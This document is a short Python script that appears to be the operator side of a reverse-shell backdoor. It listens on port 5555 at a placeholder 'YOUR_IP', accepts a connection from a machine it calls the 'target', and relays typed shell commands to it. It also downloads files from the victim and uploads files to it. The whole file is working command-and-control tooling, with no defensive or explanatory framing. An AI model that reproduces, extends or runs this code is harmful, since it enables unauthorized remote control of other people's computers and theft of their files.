import socket
import json
import os

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        while True:
            try:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        target.settimeout(None)

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while True:
        command = input(f'Shell~{ip}: ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command.startswith('cd '):
            pass
        elif command.startswith('download '):
            download_file(command[9:])
        elif command.startswith('upload '):
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('YOUR_IP', 5555))  #add IP of Host machine only
sock.listen(5)
print("Listening for incoming connection...")
target, ip = sock.accept()
print(f"Target connected: {ip}")
target_communication()
